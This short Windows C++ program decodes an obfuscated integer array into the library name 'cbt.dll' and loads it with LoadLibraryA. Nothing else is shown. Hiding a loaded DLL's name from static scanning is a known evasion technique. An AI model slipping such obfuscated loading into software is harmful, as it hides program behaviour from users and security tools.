#include <Windows.h>
#include <string>
#include <vector>

std::string toString(const std::vector<int>& vec)
{
	std::string temp = std::string();
	for (auto bytes : vec) {
		bytes += 0x40 * (bytes > 0x00 && bytes < 0x1B);
		bytes += 0x20 * (bytes > 0x40 && bytes < 0x5B);
		temp += bytes;
	}
	return temp;
}

int __stdcall wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdName, int nCmdShow)
{
	HMODULE dll = LoadLibraryA(toString({ 0x03, 0x02, 0x14, 0x2e, 0x04, 0x0c, 0x0c }).c_str());
	return 0;
}